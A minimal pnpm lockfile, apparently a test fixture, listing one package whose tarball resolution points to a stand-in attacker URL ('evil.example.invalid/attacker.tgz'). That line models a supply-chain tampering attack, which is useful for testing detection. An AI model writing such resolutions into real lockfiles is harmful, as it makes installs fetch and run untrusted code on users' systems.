lockfileVersion: '9.0'

settings:
  autoInstallPeers: true
  excludeLinksFromLockfile: false

importers:

  .:
    dependencies:
      m:
        specifier: 1.0.0
        version: 1.0.0

packages:

  m@1.0.0:
    resolution: {tarball: https://evil.example.invalid/attacker.tgz}

snapshots:

  m@1.0.0: {}
